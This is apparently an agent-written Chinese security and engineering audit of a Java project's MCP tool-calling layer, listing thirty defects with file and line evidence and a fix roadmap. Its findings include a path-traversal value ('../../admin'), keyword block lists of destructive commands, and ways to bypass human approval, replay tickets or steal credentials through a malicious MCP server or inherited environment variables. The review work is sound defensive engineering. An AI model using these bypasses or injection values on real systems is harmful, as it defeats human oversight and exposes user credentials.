| SSRF（内置 HTTP 工具） | **真实存在且质量较好**：`CMN/utils/UrlSafetyValidator.validateOrThrow` + `setFollowRedirects(false)`（`HP/mcp/function/HttpRequestToolFunction.java:66-69`）；`CMN/security/ssrf/SafeDns.java:28-47,56-121` 拦截回环/私网/链路本地/云元数据 169.254.169.254 | 仍有 TOCTOU：`UrlSafetyValidator` 先校验域名，随后 hutool `HttpRequest` 自行解析 DNS（`HttpRequestToolFunction.java:68-71`），未复用 `SafeDns`；`SafeOkHttpClientBuilder` 只被 `WebSearchToolFunction` 使用（`HP/mcp/function/WebSearchToolFunction.java:116`） | 同左 |
| 路径穿越 | 未发现显式防护；`OpenApiToMcpToolAdapter` 的 path 变量替换未做 URL 编码（`:219-226`），`userId=../../admin` 可直接改写目标路径；`McpServerRegistry.matchesUriTemplate` 用 `replaceAll` 拼正则（`:233-236`），模板中的 `.` 等字符未转义 | 推断 | 同左 |
| 命令注入 | 黑名单正则（`ZeroTrustSandboxRuntime.java:34-36`）；`CodeSandboxMcpProvider.java:15-17` 黑名单 `subprocess/os.system/eval/exec` | 均为关键字黑名单；且 Provider 根本不执行代码（见 2.9） | 同左 |
| 凭据泄漏 | 正则脱敏 `sk-.../bearer/password=`（`QuadDefenseSecurityPipeline.java:26-27`） | 只覆盖极少格式；`McpSamplingHandler.java:81` 甚至把 `"placeholder"` 当 API key 硬编码 | 同左 |

### 2.9 高危工具治理与 HITL：判定规则可用，闭环不存在

- `MCLI/safety/HighRiskToolSafetyGovernor.java:30-32,109-115`：风险等级由**工具名字符串包含关键词**决定（`drop/delete/truncate/rm/format/shutdown/reboot/kill/purge`）。误报：`format_date`、`format_json` 这类纯格式化工具会被判为 `HIGH_RISK_DESTRUCTIVE` 并强制挂起。
- 同文件 `:63-81`：高危 → 生成内存工单 → 返回 `suspended`。
- 同文件 `:90-100`：`submitApprovalDecision` 从 `pendingTickets.remove(ticketId)` 后**只返回 boolean，不恢复任何被挂起的执行、不记录审批结论到工单、不校验审批人身份**（`approverUserId` 仅打印）。→ **审批通过后没有任何执行路径**；工单无 TTL、无持久化、重启即丢。
- 真实生效的 HITL 在 `KB/service/flow/bo/ToolNodeBO.java:81-119`：靠节点配置 `requireApproval` 或工具名关键词（`:96-100`），审批结果从**工作流上下文变量** `approvalResult/approvalApproved` 读取（`:102-108`）。该变量无签名、无票据绑定、无过期时间、无调用身份绑定 → **任一上游节点写入 `approvalApproved=true` 即可让后续所有高危工具永久放行**（推断）。
- `HP/mcp/filter/McpTwoPhaseApprovalGovernor.java:84-106`：`submitDecision` 把票据状态改为 `APPROVED` 后**保留票据**，`isApproved(ticketId)` 可无限次通过 → 单张票据可授权任意多次高危调用（审批重放）。未装配。

### 2.10 幂等、超时、重试、取消、流式容错

- **幂等键设计（P1）**：`MCLI/orchestration/engine/IdempotentToolExecutionGateway.java:43-59` 命中已提交凭单后**直接返回旧响应，不比对 `existing.payloadHash()` 与新请求的 `payloadHash`** → 相同 key 不同参数会拿到错误结果。键由调用方任意提供（`:28-37`），**无工具/租户/用户命名空间**（跨租户碰撞）；`receiptStore` 无 TTL/容量上限（`:23`）；无 single-flight（两个并发线程同时 miss 后都会执行，`:43` 与 `:81` 之间无锁）。
- **超时**：三处硬编码且互不一致——stdio `tools/call` 30s（`HP/mcp/StdioMcpClient.java:147`）、断路器默认 5s（`HP/mcp/governance/McpVirtualThreadCircuitBreaker.java:47`）、HTTP POST 30s（`HP/mcp/HttpMcpClient.java:259`）。断路器 5s 超时后调用方拿到 `{"fallback":true,"error":...}` 软着陆信封（`:272-281`），**模型会把该 JSON 当作工具输出继续推理**，无法区分"真实结果"与"降级占位"（推断）。
- **重试**：无任何自动重试；`adapters` 层捕获异常后返回 `"[调用异常]: ..."` 字符串（`MCLI/adapter/McpSpringAiToolCallbackAdapter.java:84-86`），调用方无法感知失败。
- **取消**：见 2.2，缺失。
- **流式容错**：`StreamingToolchainFaultToleranceGovernor` 的 HALF_OPEN 失败**不会回到 OPEN**——`recordCallFailure` 仅在 `state==CLOSED` 时触发熔断（`:65-69`），进入 HALF_OPEN 后失败仍停留 HALF_OPEN 且 `isCallPermitted` 恒 true（`:89-91`）→ 熔断器退化为"半永久放行"。且无调用方。
- **DAG 依赖**：见 2.7 末尾，生产无调用方；`edges` 为 `ArrayList` 且 `addDependency` 不去重（`:28-34`），重复边会导致入度重复计数 → 误报环（推断）。

### 2.11 多租户、权限、审计

- **MCP 调用无身份上下文**：`HP/mcp/McpToolAdapter.executeTool(String, Map)`（`McpToolAdapter.java:296`）与 `McpClient.callTool`（`HP/mcp/McpClient.java:17`）都不含 user/tenant/trace 参数；`KB/.../ToolNodeBO.java:124-127` 直接透传工作流输入。→ 无法做工具级 RBAC、无法按租户计费/限流、无法把调用归属到人。
- **`MultiTenantDistributedQuotaGovernor`**：名字含 Distributed，实为**单 JVM 内存 Map**（`HP/mcp/gateway/MultiTenantDistributedQuotaGovernor.java:72-76`）；未注册租户一律 DENY（`:104-110`），而全仓无 `registerTenantPolicy` 生产调用点 → 若接线则全部拒绝。未装配。
- **`ToolPermissionEnforcer` / `PermissionCheckedToolCallback`**（`HP/tool/permission/*`）：有实现，但与 MCP 调用链无交集（`McpToolAdapter.executeTool` 不调用权限校验）。
- **审计**：`McpExecutionReceipt`/`McpOrchestrationReceipt`/`McpServerExportReceipt` 等均为内存记录且执行路径不签发；无审计表、无落库、无导出。`MCLI/model/McpExecutionReceipt.java` 在全仓无引用方。

---

## 3 缺陷与风险清单

> 严重度定义：P0=核心能力名存实亡或安全边界与声明严重不符；P1=生产可用性/正确性/安全显著受损；P2=工程健壮性或维护性问题。全部为只读静态审计结论，未运行验证（标注"推断"者除外）。

| 编号 | 级别 | 缺陷 | 证据（路径:行） | 影响 | 最小改动建议 |
|---|---|---|---|---|---|
| D01 | **P0** | 语义工具路由在生产中不存在：索引向量恒 `null`，检索恒返回全量；WorkerAgent 动态投影使用全零向量，Top-K 实为 hash 序 | `HP/mcp/McpToolAdapter.java:155`；`HP/mcp/governance/McpToolSemanticRetriever.java:73-78,115-124`；`HP/tool/discovery/ToolDiscoveryService.java:73-79`；`HP/mcp/governance/McpTwoPhaseProjectionGovernor.java:202-218` | 工具越多越乱；"按意图选工具"能力为 0；与 1536 维超球面叙事不符 | 新增一个 `ToolEmbeddingIndexer`：注册工具时调用唯一 Qwen Embedding（1536，L2 归一化）落索引；检索用真实 query 向量；无向量时**明确降级并告警**而非静默全量 |
| D02 | **P0** | 平台自身作为 MCP Server 的能力为桩：4 个 Provider 全部返回硬编码假数据；`qknow-mcp-server` 无任何生产装配 | `MSRV/provider/KnowledgeBaseMcpProvider.java:59-69`（伪造余弦分）；`KnowledgeGraphMcpProvider.java:39-54`（硬编码"实体A→导致→实体B"）；`DataAgentMcpProvider.java:60-87`（伪造 2 行结果）；`CodeSandboxMcpProvider.java:41-53`（未执行任何代码，返回"耗时 42ms/结果 42"）；`backend/qknow-server/pom.xml`（无 qknow-mcp-server 依赖） | 对外宣称"企业 MCP 工具生态已打通"失实；接入方会拿到假数据 | 对外口径改为"未启用"；如需真实化，Provider 必须调用 `kq-knowledge`/`neo4j`/`dataagent` 真实服务并补契约测试 |
| D03 | **P0** | 零信任/沙箱不构成隔离：`ZeroTrustSandboxRuntime` 为同 JVM 线程；真实 stdio 子进程继承全部宿主环境变量；防线四清环境变量未接入启动路径 | `MCLI/gateway/ZeroTrustSandboxRuntime.java:14,116-142`；`MCLI/client/transport/StdioEnterpriseTransport.java:81-90`；`QuadDefenseSecurityPipeline.java:129-137` vs `:81-90` | 子进程可读取 `DEEPSEEK_API_KEY` 等全部凭据；"外泄概率 0.0%"不成立 | 在 `StdioEnterpriseTransport.start()` 与 `StdioMcpClient.ensureFallbackConnected()` 统一调用环境白名单清洗；长期用容器/`bwrap`/`sandbox-exec` 做真隔离，并只保留白名单 env |
| D04 | **P1** | 审批/HITL 无闭环：审批通过不恢复执行；工作流 HITL 仅凭上下文变量放行；票据可无限重放 | `MCLI/safety/HighRiskToolSafetyGovernor.java:90-100`；`KB/service/flow/bo/ToolNodeBO.java:102-119`；`HP/mcp/filter/McpTwoPhaseApprovalGovernor.java:84-106` | 高危操作要么无法执行，要么可被绕过/重放 | 审批记录改为"票据+参数哈希+请求一次性消费+TTL+审批人角色校验"，执行侧以 `ticketId+payloadHash` 原子核销 |
| D05 | **P1** | 协议版本双轨且落后 4 代；不校验 server 返回版本；HTTP 侧仍用已被替换的 HTTP+SSE 模型 | `MCLI/McpClientManager.java:94`；`MCORE/model/InitializeResult.java:15`；`HP/mcp/StdioMcpClient.java:30,79-86`；`HP/mcp/HttpMcpClient.java:197,78-143` | 与真实第三方 server 握手后语义错配 | 统一常量到单一 `McpProtocolVersion` 类；client 校验并协商；HTTP 传输迁移 Streamable HTTP 单端点 |
| D06 | **P1** | 不支持 server→client 通知/请求（progress、list_changed、sampling、elicitation），且未知字段即解析失败 | `MCLI/client/transport/StdioEnterpriseTransport.java:109-128`；`MCORE/protocol/JsonRpcResponse.java:10-15` | 无进度、无变更感知、无采样；扩展字段导致请求永久挂起 | `ObjectMapper` 关闭 `FAIL_ON_UNKNOWN_PROPERTIES`；读循环按 `method` 分派 request/notification/response |
| D07 | **P1** | 无分页：`tools/list`/`resources/list`/`prompts/list` 都不处理 `cursor`/`nextCursor` | `MCLI/McpClientManager.java:134`；`HP/mcp/StdioMcpClient.java:113`；`MSRV/registry/McpServerRegistry.java:134-137,169-186` | 工具上千时静默截断（若 server 分页）；服务端无法承载大工具集 | client 循环拉页；server 实现 `cursor`+`nextCursor` |
| D08 | **P1** | 取消语义缺失；超时只 cancel 本地 Future，不通知 server | `HP/mcp/governance/McpVirtualThreadCircuitBreaker.java:199-203`；`HP/mcp/HttpMcpClient.java:230-237` | 服务端副作用继续执行（扣款/删数据）；资源浪费 | 超时统一发送 `notifications/cancelled{requestId,reason}`，并把 requestId 暴露到 gateway 层 |
| D09 | **P1** | 幂等网关键设计缺陷：不比对 payloadHash、无租户命名空间、无 TTL、无 single-flight | `MCLI/orchestration/engine/IdempotentToolExecutionGateway.java:43-59,81` | 同键不同参返回错误结果；跨租户串味；内存泄漏 | key = `tenant|tool|payloadSha256|userKey`；命中时比对哈希，不一致返回冲突；加 TTL+容量上限 |
| D10 | **P1** | HTTP 传输可被 server 引导外发凭据（SSRF/凭据外泄），无域白名单、无 Origin/Session 校验 | `HP/mcp/HttpMcpClient.java:112-113,317-334` | 恶意 MCP server 窃取 Bearer/工具参数 | `endpoint` 事件必须与 baseUrl 同源，否则拒绝；不向非同源目标附加 Authorization |
| D11 | **P1** | 传输层请求-响应关联断裂（潜伏）：`McpSession.send` 路径重生成 id，导致 pending future 永不完成 | `MCLI/client/transport/StdioEnterpriseTransport.java:187-188,248-250`；`MCLI/McpClientManager.java:53-66,44-51` | 若接线 `McpClientManager`，所有调用 100% 超时 | 传输层复用调用方传入的 `id`；或删除 `McpSession.send` 重载，统一走 `sendRequest` 返回值 |
| D12 | **P1** | 背压信用可永久泄漏，16 次异常后传输层不可用；无请求级超时兜底 | `MCLI/client/transport/StdioEnterpriseTransport.java:175,190-198` | 长稳运行后 MCP 通道"假死" | 每个 pending future 加超时（`orTimeout`），超时归还信用并计数 |
| D13 | **P1** | 工具执行失败被吞为成功：ToolNode 始终 `status=SUCCESS`；Adapter 把异常转普通字符串 | `KB/service/flow/bo/ToolNodeBO.java:127-153`；`MCLI/adapter/McpSpringAiToolCallbackAdapter.java:84-86` | 工作流静默走错分支，问题无法定位 | 解析 `{"error":...}` 与 `isError`，映射为节点失败/重试；返回结构化错误信封 |
| D14 | **P1** | 采样（Sampling）路径用 `"placeholder"` API key 硬编码，且无审批/配额 | `HP/mcp/McpSamplingHandler.java:81`；`HP/mcp/HttpMcpClient.java:154-166` | 采样功能不可用；若修好则 server 可无限触发 LLM 花费 | 由 `ChatModelFactory` 注入真实凭据；加采样审批+每次 token 上限+速率限制；响应以 JSON-RPC response 发送 |
| D15 | **P1** | 租约令牌经工具参数传递并明文入日志，且不绑定主体 | `MSRV/security/QuadDefenseSecurityPipeline.java:63-75`；`MSRV/security/McpTransientLeaseManager.java:39-88` | 令牌泄漏可被重放（60s 窗口）；日志留存机密 | 令牌走 MCP `_meta`/HTTP 头而非 arguments；日志脱敏；租约绑定 `tenant+user+tool+argsHash` |
| D16 | **P1** | "密码学存证"实为无密钥 SHA-256，只能自洽不能取信 | `MCORE/dto/McpToolRoutingAuditReceipt.java:125-163`；`MSRV/model/McpServerExportReceipt.java:115-129`；`MCLI/model/McpExecutionReceipt.java` | 无法作为第三方可验证凭证；审计价值被高估 | 若需对外可验证：HMAC（服务端密钥）或 ECDSA；否则在文档中降级为"完整性摘要" |
| D17 | **P1** | 关键契约测试自证循环：Token 压缩率=计数比（恒 ≥0.85）；伪 embedding 自相似；延迟断言放宽到 10ms 与 javadoc 3ms 不符 | `MCLI/routing/TwoStageDynamicToolRouter.java:148`；`backend/qknow-mcp/qknow-mcp-client/src/test/java/tech/qiantong/qknow/mcp/McpEcosystemContractTest.java:159-171,202-206` | 测试通过 ≠ 能力成立；误导评审 | 增加"真实 Qwen 向量 vs 伪随机向量"的 A/B 对照；压缩率按字符/token 实测；用外部 server 做 conformance 测试 |
| D18 | **P2** | server 端 `tools/list` 污染 schema（`requiresLease`/`riskLevel`） | `MSRV/registry/McpServerRegistry.java:77-79` | 严格 client 判非法 schema；内部风控信息外泄 | 风控元数据放 `_meta` 或服务端内部表 |
| D19 | **P2** | 内容类型仅 text，无 image/audio/resource/structuredContent/outputSchema | `MCORE/model/{ToolContentItem,CallToolResult,McpTool}.java` | 无法接多模态/结构化工具 | 按规范扩展 sealed 接口子类型 |
| D20 | **P2** | 服务端 stdio 单线程处理（head-of-line），无并发、无取消 | `MSRV/transport/StdioServerEnterpriseTransport.java:47-51,61-100` | 单个慢工具阻塞全部请求 | 改为"读线程 + 虚拟线程池"，按 requestId 并发执行 |
| D21 | **P2** | 服务端对通知也会回 response（协议违规） | `MSRV/registry/McpServerRegistry.java:119-121,203-205`（无 id 的 notification 走 default 分支返回 error） | 严格 client 判协议错误 | 无 `id` 的报文一律不回复 |
| D22 | **P2** | 16KB/64KB/16000 三处截断阈值不一致；单一 16KB 请求上限过小 | `QuadDefenseSecurityPipeline.java:24`；`HP/mcp/sandbox/EphemeralToolSandboxRuntime.java:28-31`；`MCLI/security/McpSecurityFilterPipeline.java:78` | 大参数/大结果被误拒或误截 | 统一为可配置 `mcp.maxPayloadBytes`/`maxResultBytes` |
| D23 | **P2** | `McpToolRequest.params` 包装导致参数二次嵌套，与 MCP tool inputSchema 不一致 | `HP/mcp/McpToolAdapter.java:368-385,404-405` | DeepSeek function-call 生成的参数结构可能不被 server 接受；需模型多包一层 | 直接以 `Map<String,Object>`/动态 schema 作为 inputType，或在 `apply` 中展开顶层字段 |
| D24 | **P2** | 工具命名三套并存：`mcp.<server>.<tool>` / `mcp_<server>_<tool>` / `mcp__server__tool`，无长度与字符集约束 | `HP/mcp/McpToolAdapter.java:144`；`MCLI/adapter/McpSpringAiToolCallbackAdapter.java:53-55`；`MCORE/util/McpNamingConvention.java` | 与 LLM API 工具名限制（≤64、`[a-zA-Z0-9_-]`）冲突风险；路由解析歧义 | 单一规范 + 注册时校验并拒绝非法名 |
| D25 | **P2** | `StreamingToolchainFaultToleranceGovernor` 半开失败不回 OPEN，熔断永久放行；`McpOrchestrationControlBus` 用 `currentTimeMillis()*1000` 做微秒抖动判定、数组无安全发布 | `MCLI/orchestration/engine/StreamingToolchainFaultToleranceGovernor.java:65-70,89-91`；`MCLI/orchestration/engine/McpOrchestrationControlBus.java:36-57` | 熔断失效；抖动指标无意义；读线程可见陈旧帧 | 半开失败立即 OPEN；改用 `System.nanoTime()`；用 `VarHandle`/`AtomicReferenceArray` 发布 |
| D26 | **P2** | `ToolRagFilter`/`SemanticToolRegistry` O(N²) 注册、线性扫描、无 recall 度量 | `MCLI/routing/SemanticToolRegistry.java:20-26`；`MCLI/routing/ToolRagFilter.java:44-54` | 千级工具时注册与查询成本上升，无质量指标 | 接入 HNSW（已有 `HP/tool/hnsw/*` 但同样未装配）+ recall@k 评测 |
| D27 | **P2** | 内存态无 TTL：`pendingRequests`、审批票据、租约、幂等凭单、`circuitMap` 均无上限/清理 | `MCLI/McpClientManager.java:34`；`MCLI/safety/HighRiskToolSafetyGovernor.java:35`；`MSRV/security/McpTransientLeaseManager.java:33`；`MCLI/orchestration/engine/IdempotentToolExecutionGateway.java:23` | 长稳运行内存增长；审批记录不可追溯 | 统一给这些结构加容量上限 + TTL 清理任务 |
| D28 | **P2** | `ToolCallbackResolverConfig` 通过反射取 `getGenericInterfaces()[0]`，对 lambda/继承类型易抛异常 | `AI/config/ToolCallbackResolverConfig.java:62-72` | 启动期/调用期类型错误 | 改为 `ResolvableType` 解析或要求显式声明 inputType |
| D29 | **P2** | 断路器/路由器对"工具数量上千"无任何预算控制：无 schema 体积预估、无并发检索上限、无缓存 | 各处 | 上下文膨胀、首字延迟上升 | 加 `maxToolsPerRequest`、schema token 预算、检索结果 LRU 缓存 |
| D30 | **P2** | 无 `resources/subscribe`、`logging`、`completion`、`ping` 等工具方法 | `MSRV/registry/McpServerRegistry.java:129-205` | 协议覆盖不完整，第三方 client 兼容性差 | 至少补 `ping` 与 `logging/setLevel` |

---

## 4 优化建议

### 4.1 立即执行（1–3 天，纯文档与开关，不改算法）

1. **对外表述纠偏**：按 D01/D02/D03 把"MCP 工具生态已打通/零信任沙箱/语义路由"在对外材料中降级为"存在代码资产，默认未启用"；标注四类：真实可用（stdio+HTTP 客户端、`tools/list`+`tools/call`、schema 轻校验、SSRF 防护）、装饰实现（Provider、Streamable HTTP 端点）、未装配（路由/安全/编排/幂等/沙箱）、危险默认（子进程继承环境变量）。
2. **一致性与安全兜底（最小改动、可回滚）**：
   - `StdioEnterpriseTransport.start()` 与 `StdioMcpClient.ensureFallbackConnected()` 增加环境白名单清洗（复用 `EphemeralToolSandboxRuntime.buildSanitizedEnvironment`），这是一行级改动即可消除 D03 的最大风险面。
   - `ObjectMapper` 增加 `.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false)`，消除 D06 的"扩展字段即挂起"。
   - 每个 pending future 加 `orTimeout`，消除 D12 的信用泄漏。
3. **注册真实工具（最小可用集）**：在 `application.yml` 引入 `qknow.mcp.servers[]`（name/transport/command|url/env allowlist），由 `McpToolAdapter` 读取并注册；同时把 `toolCode` 纳入管理面（列表/启停/风险等级），这是"生态"从 0 到 1 的前提。

### 4.2 第二阶段（1–2 周，打通真实语义路由）

1. 新增唯一注入点 `ToolEmbeddingIndexer`：工具注册 → 调 Qwen Embedding（1536 维、L2 归一化）→ 写入索引；`McpToolSemanticRetriever.indexTool` 的 vector 参数改为必填，`null` 直接拒绝注册（fail-fast，避免再次静默退化）。
2. 检索路径统一：只保留一个 router（建议 `McpToolSemanticRetriever` + 阈值 + Top-K），其余 3 套 router 标注 `@Deprecated` 并在 6 个月内删除；删除 `OpenApiToMcpToolAdapter.generateDeterministicHypersphericalEmbedding` 或改名为 `pseudoRandomProjection` 且禁止用于路由。
3. 引入最小评测：`recall@5`（人工 qrel 100 条 tool-query 对）、路由 p50/p99、注入 schema token 数；在 CI 中以固定 fixture 跑，禁止用"计数比"冒充压缩率。

### 4.3 第三阶段（3–4 周，协议与治理补齐）

1. 协议：单一 `McpProtocolVersion`；版本协商与校验；`cursor` 分页；`notifications/cancelled`；`progressToken`；`ping`；服务端通知不回包；Streamable HTTP 单端点（含 `Mcp-Session-Id`、`Origin` 校验、`Last-Event-ID` 续传）。
2. 治理：以"租户+用户+工具+参数哈希"为键的授权与幂等；审批票据一次性消费 + TTL + 审批人角色；调用身份透传到 `executeTool`；审计事件落库（谁、何时、哪个工具、参数摘要、结果码、延迟）。
3. 沙箱：容器化 MCP server（Docker/`bwrap`），无网络或白名单出网、只读根文件系统、独立 cgroup、非 root 用户；stdio 只作为开发态传输。

### 4.4 建议的验收门槛（可直接写进下一阶段契约）

- 一致性：对 2 个公开 MCP server（stdio 与 Streamable HTTP 各 1）跑通 `initialize → tools/list(含分页) → tools/call → 取消` 全流程，并断言版本协商结果。
- 质量：`recall@5 ≥ 0.8`（100 条 qrel）；1,000 工具下路由 p99 ≤ 50ms（不含 embedding 网络时延，单独计量）。
- 安全：子进程 env 中不含任何 `*KEY*/*TOKEN*/*SECRET*`；恶意 server 的异源 `endpoint` 事件被拒绝；审批票据重放 100% 拒绝。
- 可靠性：连续 10,000 次调用无信用泄漏（inFlight 归零）、无 pendingRequests 残留。

---

## 5 与顶级工具生态的差距

> 说明：MCP 官方规范部分为**已验证**（附录 A.3 列 URL 与抓取日期）；OpenAI Agents SDK / Anthropic tool-use / Dify 插件体系部分为**推断/未验证**——本轮未抓取其官方文档，仅按行业通行能力做差距定位，不可作为交付依据。

| 能力维度 | 本项目现状 | MCP 官方规范 / 顶级生态通行做法 | 差距性质 |
|---|---|---|---|
| 协议版本与协商 | 双轨 2024-11-05 / 2025-03-26，无协商 | 最新 2026-07-28，Lifecycle 强制版本协商（已验证） | 代际差距，需重写握手 |
| 传输 | stdio 可用；HTTP 为已废弃的 HTTP+SSE | stdio + Streamable HTTP（单端点多路复用、Session、续传）| 需替换传输实现 |
| 工具描述 | name/description/inputSchema | + `title`、`outputSchema`、`annotations`（readOnly/destructive/idempotent/openWorld）、`icons`（规范 Tools 页已验证） | 模型难以做安全决策，需扩展模型 |
| 内容类型 | 仅 text | text/image/audio/resource_link/embedded resource/structuredContent（已验证） | 多模态与结构化能力缺口 |
| 分页/进度/取消 | 全缺 | 规范基本工具能力（规范首页 Utilities 已验证列出 progress/cancellation/error reporting） | 协议基础能力缺口 |
| 授权 | 无；租约自造 | 规范含独立 Authorization 章节（OAuth 2.1 体系；细节本轮未抓取=未验证） | 企业接入硬门槛 |
| 服务端实现 | Provider 为假数据、无端点 | 官方 SDK（TS/Python/Java/Kotlin/C#）提供 server+client 完整实现与 conformance | 建议直接采用官方 Java SDK 而非自研协议层 |
| 工具选择 | 无真实语义检索 | 主流做法：`tool_choice` 控制 + 语义检索（RAG over tools）+ 严格 JSON Schema + 并行工具调用 | 能力缺口 + 算法缺口 |
| 可观测 | 无 | 分布式追踪（OTel）、工具调用 span、token/成本计量、审计日志 | 运营与合规缺口 |
| 沙箱 | 同 JVM / 裸子进程 | 容器/微虚拟机 + 网络与文件系统策略 + 无凭据注入 | 安全架构缺口 |
| 插件治理 | 无 manifest、无版本、无市场 | Dify 插件：manifest + provider schema + OAuth + 配额 + 市场分发（**未验证**） | 生态运营缺口 |
| 测试 | 自证循环契约测试 | 官方 conformance 测试 + 真实第三方 server 互操作测试 | 质量门禁缺口 |

**一句话定位**：当前是一套"自研 MCP 客户端的原型 + 大量未接线的能力装饰"，与"企业级工具生态"的真实差距不在功能多少，而在**协议正确性、语义路由真实性、隔离真实性、治理闭环**四项。

---

## 6 未验证与需 Lead 决策事项

### 6.1 未验证清单（明确不可作为结论外推）

1. **未运行任何测试**：受"禁止 mvn/gradle/长测试/启动服务"约束。除 `qknow-mcp-client/target/surefire-reports` 中已存在的历史结果（4 个用例通过）外，其余 40+ MCP 测试的真实通过情况未知。
2. **未抓取 OpenAI Agents SDK / Anthropic tool-use / Dify 官方文档**：第 5 章相关行标注为推断。
3. **MCP Authorization 细节未抓取**：仅确认规范存在 Authorization 章节；OAuth 2.1 具体 MUST 条款未逐字核对（未验证）。
4. **运行时行为未验证**：所有"100% 超时""永久熔断""审批可绕过"均为代码级推断；需一次最小复现实验（本地启动一个 mock MCP server + 单测，不启动整服务）确认。
5. **`tech.qiantong.qknow.hermes.*` 与 `tech.qiantong.qknow.ai.*` 的 Bean 装配**：`AgentOrchestrator`/`WorkerAgent`/`ToolDiscoveryService` 在 `src/main` 中找不到构造点（仅测试构造），需 Lead 确认真实运行时它们是否由其他配置类/反射装配；若确实未装配，则 Hermes 侧除 `McpToolAdapter` 外的工具编排能力同样为未启用状态（推断）。
6. **生产部署是否注入 `GITHUB_PERSONAL_ACCESS_TOKEN`**：未知。若未注入，则默认 MCP 工具数为 0。

### 6.2 需 Lead 决策事项

1. **口径决策（最高优先级）**：本报告中"外部宣称"与"真实实现"的落差涉及论文/验收材料。请决定是否在后续材料中按 4.1 第 1 条统一降级表述；这影响 task-1/2/3 的写作口径。
2. **技术路线决策**：继续自研协议层，还是迁移到 MCP 官方 Java SDK？从 D05–D12 看，自研层的协议正确性修复成本已高于迁移成本。
3. **`qknow-mcp` 模块去留**：6,700 行未装配代码是删除、标注归档，还是接线？若接线必须先修 D11（id 关联断裂）。
4. **MCP Server 对外定位**：平台是否真要作为 MCP Server 对外开放工具？若"是"，四个 Provider 必须替换为真实实现并补授权；若"否"，建议仓库内明确标注"示例/桩"，避免被误用与误宣传。
5. **沙箱方案选择**：短期 env 清洗（1 行改动）+ 中期容器化，是否进入下一阶段预算。
6. **测试门禁**：是否采纳 4.4 的验收门槛（特别是"禁止用计数比冒充 token 压缩率""禁止用同源自相似测试证明语义路由"）。

---

### 附录 A 证据索引

#### A.1 关键源码证据（按结论编号）

- D01：`HP/mcp/McpToolAdapter.java:155`、`HP/mcp/governance/McpToolSemanticRetriever.java:73-78,115-124`、`HP/tool/discovery/ToolDiscoveryService.java:73-79`、`HP/mcp/governance/McpTwoPhaseProjectionGovernor.java:202-218,106-117`、`HA/WorkerAgent.java:95-107`、`MSRV/adapter/OpenApiToMcpToolAdapter.java:269-296,113-114`、`MCLI/routing/TwoStageDynamicToolRouter.java:118-125,148`。
- D02：`MSRV/provider/KnowledgeBaseMcpProvider.java:59-69`、`MSRV/provider/KnowledgeGraphMcpProvider.java:39-54`、`MSRV/provider/DataAgentMcpProvider.java:60-87`、`MSRV/provider/CodeSandboxMcpProvider.java:41-53`、`backend/qknow-server/pom.xml`、`backend/tests/pom.xml:84`、`MSRV/transport/StdioServerEnterpriseTransport.java:54-100`、`HP/mcp/transport/StreamableHttpEndpointHandler.java:67-86`（硬编码 2 个假工具 + "远端执行成功"）。
- D03：`MCLI/gateway/ZeroTrustSandboxRuntime.java:14,24-26,60-76,100-105,116-142`、`MCLI/client/transport/StdioEnterpriseTransport.java:81-90`、`HP/mcp/StdioMcpClient.java:207-213`、`QuadDefenseSecurityPipeline.java:129-137`、`HP/mcp/sandbox/EphemeralToolSandboxRuntime.java:126-139,37-39`。
- D04：`MCLI/safety/HighRiskToolSafetyGovernor.java:30-32,63-81,90-100,109-115`、`KB/service/flow/bo/ToolNodeBO.java:81-119`、`HP/mcp/filter/McpTwoPhaseApprovalGovernor.java:41-57,84-106`。
- D05：`MCLI/McpClientManager.java:94`、`MCORE/model/InitializeResult.java:15`、`HP/mcp/StdioMcpClient.java:30`、`HP/mcp/HttpMcpClient.java:197`。
- D06/D07/D08：`MCLI/client/transport/StdioEnterpriseTransport.java:109-128`、`MCORE/protocol/JsonRpcResponse.java:10-15`、`MCLI/McpClientManager.java:134`、`HP/mcp/StdioMcpClient.java:113`、`MSRV/registry/McpServerRegistry.java:134-137`、`HP/mcp/governance/McpVirtualThreadCircuitBreaker.java:199-203`。
- D09/D13/D23/D24：`MCLI/orchestration/engine/IdempotentToolExecutionGateway.java:28-59,81`、`KB/service/flow/bo/ToolNodeBO.java:127-153`、`MCLI/adapter/McpSpringAiToolCallbackAdapter.java:53-55,84-86`、`HP/mcp/McpToolAdapter.java:144,368-385,404-405`、`MCORE/util/McpNamingConvention.java`。
- D10/D14：`HP/mcp/HttpMcpClient.java:112-113,154-166,230-242,259,317-334`、`HP/mcp/McpSamplingHandler.java:81,88-104`。
- D11/D12：`MCLI/client/transport/StdioEnterpriseTransport.java:172-198,248-250`、`MCLI/McpClientManager.java:34,44-51,53-66`。
- D15/D16/D17：`QuadDefenseSecurityPipeline.java:63-75`、`MSRV/security/McpTransientLeaseManager.java:33,39-88`、`MCORE/dto/McpToolRoutingAuditReceipt.java:105-163`、`MSRV/model/McpServerExportReceipt.java:115-129`、`backend/qknow-mcp/qknow-mcp-client/src/test/java/tech/qiantong/qknow/mcp/McpEcosystemContractTest.java:159-206`。
- D18/D19/D20/D21：`MSRV/registry/McpServerRegistry.java:77-79,119-121,129-205`、`MCORE/model/{McpTool,CallToolResult,ToolContentItem}.java`、`MSRV/transport/StdioServerEnterpriseTransport.java:47-51,61-100`。
- D22/D25/D26/D27/D28/D29/D30：`QuadDefenseSecurityPipeline.java:24`、`HP/mcp/sandbox/EphemeralToolSandboxRuntime.java:28-31`、`MCLI/security/McpSecurityFilterPipeline.java:78`、`MCLI/orchestration/engine/StreamingToolchainFaultToleranceGovernor.java:65-70,89-91`、`MCLI/orchestration/engine/McpOrchestrationControlBus.java:36-57`、`MCLI/routing/SemanticToolRegistry.java:20-26`、`MCLI/routing/ToolRagFilter.java:44-54`、`MCLI/McpClientManager.java:34`、`AI/config/ToolCallbackResolverConfig.java:62-72`。
- 装配与孤岛：`backend/qknow-server/src/main/java/tech/qiantong/qknow/server/QKnowApplication.java:21-26`、`backend/qknow-server/src/main/java/tech/qiantong/qknow/server/config/HermesConfiguration.java:29-33`、`backend/qknow-hermes/qknow-hermes-core/pom.xml:152-158`、`backend/qknow-server/pom.xml`、`KB/tool/mcp/McpToolAdapter.java:16-21`。
- 正向证据（真实有效的实现）：`HP/mcp/function/HttpRequestToolFunction.java:63-71`、`CMN/security/ssrf/SafeDns.java:28-47,56-121`、`CMN/security/ssrf/SafeOkHttpClientBuilder.java:21-112`、`HP/mcp/McpSchemaValidator.java:41-110`、`MCLI/client/transport/StdioEnterpriseTransport.java:98-100,138-151,320-335`。

#### A.2 测试与产物

